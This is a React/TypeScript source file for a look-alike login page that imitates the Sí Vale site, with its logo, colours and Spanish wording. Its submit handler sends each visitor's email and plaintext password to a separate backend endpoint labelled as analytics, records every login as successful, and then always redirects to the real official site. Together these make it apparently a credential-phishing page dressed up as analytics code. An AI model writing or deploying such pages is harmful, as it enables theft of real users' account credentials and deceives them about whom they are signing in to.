// src/components/LoginSiVale.tsx
import React, { useEffect, useMemo, useState } from "react";

// 🔗 Cambia esta URL a donde corre tu FastAPI
const BACKEND_BASE = "http://localhost:8000";
const OFFICIAL_URL = "https://www.sivale.mx/";

// POST JSON utilitario
async function postJSON(path: string, body: any) {
  const res = await fetch(`${BACKEND_BASE}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  let data: any = null;
  try {
    data = await res.json();
  } catch {}
  return { ok: res.ok, status: res.status, data };
}

// Session ID estable por navegador (para poder agrupar eventos)
function useSessionId() {
  return useMemo(() => {
    const KEY = "analytics_session_id";
    let sid = localStorage.getItem(KEY);
    if (!sid) {
      sid =
        (typeof crypto !== "undefined" && "randomUUID" in crypto
          ? crypto.randomUUID()
          : Math.random().toString(36).slice(2)) + "-" + Date.now();
      localStorage.setItem(KEY, sid);
    }
    return sid;
  }, []);
}

export default function LoginSiVale() {
  const [email, setEmail] = useState("");
  const [pwd, setPwd] = useState("");
  const [showPwd, setShowPwd] = useState(false);
  const [loading, setLoading] = useState(false);

  const session_id = useSessionId();
  const ready = email.trim().length > 0 && pwd.trim().length > 0;

  // 1) Registrar visita al montar
  useEffect(() => {
    (async () => {
      await postJSON("/analytics/visit", {
        interface: "AT",
        page: "/login",
        step: 0,
        progress_pct: 0,
        session_id,
        extra: {
          event: "mount",
          referrer: document.referrer || "",
        },
      });
    })();
  }, [session_id]);

  // 2) Registrar login + otra visita y redirigir
  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!ready || loading) return;
    setLoading(true);
    try {
      // a) Login (el backend enmascara/hashea la contraseña según config)
      await postJSON("/analytics/login", {
        email,
        password: pwd,
        success: true,           // si tu flujo no valida, déjalo true para registrar “login completo”
        method: "password",
        session_id,
        extra: { src: "frontend" },
      });

      // b) Marca el submit como visita final del flujo
      await postJSON("/analytics/visit", {
        interface: "AT",
        page: "/login/submit",
        step: 1,
        progress_pct: 100,
        session_id,
        extra: { event: "submit", email_preview: email },
      });
    } catch {}
    // c) Redirige siempre (tu comportamiento actual)
    window.location.assign(OFFICIAL_URL);
  };

  return (
    <div className="min-h-screen bg-white text-slate-700 relative">
      {/* FONDO con líneas curvas (SVG) */}
      <div className="absolute inset-x-0 top-0 h-48 pointer-events-none select-none">
        <svg viewBox="0 0 1440 320" className="w-full h-full opacity-50">
          <path
            fill="none"
            stroke="#F57723FF"
            strokeWidth="1.3"
            d="M0,112 C240,32 480,192 720,128 C960,64 1200,80 1440,32"
          />
          <path
            fill="none"
            stroke="#F57723FF"
            strokeWidth="1.3"
            d="M0,192 C240,224 480,64 720,128 C960,192 1200,272 1440,224"
          />
          <path
            fill="none"
            stroke="#F57723FF"
            strokeWidth="1.3"
            d="M0,64 C240,128 480,16 720,64 C960,112 1200,208 1440,160"
          />
        </svg>
      </div>

      {/* CONTENEDOR PRINCIPAL */}
      <div className="mx-auto w-full max-w-sm px-6 pt-24 pb-14">
        {/* LOGO */}
        <div className="w-full flex justify-center mb-6">
          <img
            src="/logo-sivale.png"
            alt="Sí Vale"
            className="h-28 w-auto md:h-32 lg:h-36 select-none pointer-events-none"
            style={{ filter: "drop-shadow(0 10px 24px rgba(0,0,0,.12))" }}
          />
        </div>

        {/* TÍTULO y subtítulo */}
        <h1 className="text-3xl font-extrabold text-slate-700 text-center">
          ¡Nos alegra verte por aquí!
        </h1>
        <p className="mt-2 text-[17px] text-slate-500 text-center">
          Inicia sesión o crea una cuenta
        </p>

        {/* FORM */}
        <form onSubmit={submit} className="mt-6 space-y-5">
          {/* Email */}
          <div>
            <div className="flex items-center gap-3 text-slate-500">
              <svg width="20" height="20" viewBox="0 0 24 24" className="opacity-80">
                <path
                  fill="currentColor"
                  d="M2 6a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v.4L12 12 2 6.4V6Zm0 3.1V18a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9.1l-9.3 5.8a2 2 0 0 1-2.1 0L2 9.1Z"
                />
              </svg>
              <input
                type="email"
                inputMode="email"
                placeholder="tuemail@correo.com"
                className="w-full pb-2 outline-none placeholder-slate-400 border-b"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>
            <div className="mt-1 text-xs text-slate-400">Correo electrónico</div>
          </div>

          {/* Password */}
          <div>
            <div className="flex items-center gap-3 text-slate-500">
              <svg width="20" height="20" viewBox="0 0 24 24" className="opacity-80">
                <path
                  fill="currentColor"
                  d="M12 1a5 5 0 0 0-5 5v3H5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-2V6a5 5 0 0 0-5-5Zm3 8H9V6a3 3 0 1 1 6 0v3Z"
                />
              </svg>
              <input
                type={showPwd ? "text" : "password"}
                placeholder="contraseña"
                className="w-full pb-2 outline-none placeholder-slate-400 border-b"
                value={pwd}
                onChange={(e) => setPwd(e.target.value)}
                required
              />
              <button
                type="button"
                onClick={() => setShowPwd((v) => !v)}
                className="px-1 text-slate-500"
                aria-label={showPwd ? "Ocultar contraseña" : "Mostrar contraseña"}
                title={showPwd ? "Ocultar contraseña" : "Mostrar contraseña"}
              >
                {showPwd ? (
                  <svg width="20" height="20" viewBox="0 0 24 24">
                    <path
                      fill="currentColor"
                      d="M2 5.3 3.3 4l16.7 16.7-1.3 1.3-3.5-3.5A10.5 10.5 0 0 1 2 12c.8-1.6 2-3 3.4-4.2L2 5.3Zm11.7 11.7-2-2a3.5 3.5 0 0 1-2-2l-2.1-2.1a6.8 6.8 0 0 0-.9.7c-1.1.9-2 2.1-2.7 3.4 1.7 3 4.5 5 7.9 5.3 0 0 1.2.1 1.8-.3Zm6.7-2.6c-1 1.7-2.6 3.2-4.5 4.3l-1.5-1.6a8.8 8.8 0 0 0 4.9-4.6c-1.7-3-4.7-5-8.3-5.2-.6 0-1.2 0-1.8.2L7.8 5a10.6 10.6 0 0 1 3.1-.5c4.3.1 8 2.5 10 6.2c-.3.7-.9 1.7-1.5 2.7Z"
                    />
                  </svg>
                ) : (
                  <svg width="20" height="20" viewBox="0 0 24 24">
                    <path
                      fill="currentColor"
                      d="M12 5c4.3.1 8 2.5 10 6.2c-2 3.7-5.7 6.1-10 6.2C7.7 17.3 4 14.9 2 11.2C4 7.5 7.7 5.1 12 5Zm0 3.5A3.5 3.5 0 1 0 12 15a3.5 3.5 0 0 0 0-7Z"
                    />
                  </svg>
                )}
              </button>
            </div>
            <div className="mt-1 text-xs text-slate-400">Contraseña</div>
          </div>

          {/* Olvidaste */}
          <div className="text-right">
            <a className="text-[15px]" style={{ color: "#f48b21" }} href="#">
              ¿Olvidaste tu contraseña?
            </a>
          </div>

          {/* CTA */}
          <button
            type="submit"
            disabled={!ready || loading}
            className="w-full py-3 rounded-full text-white text-lg font-semibold shadow transition-colors disabled:opacity-60"
            style={{
              background: ready
                ? "linear-gradient(90deg,#f59e35,#f48b21)"
                : "linear-gradient(90deg,#cfcfcd,#e4ded7)",
            }}
          >
            {loading ? "Conectando..." : "Iniciar sesión"}
          </button>

          <p className="text-center text-slate-600 mt-2">
            ¿No tienes una cuenta?{" "}
            <a className="font-medium" style={{ color: "#f48b21" }} href="#">
              Regístrate
            </a>
          </p>
        </form>
      </div>
    </div>
  );
}
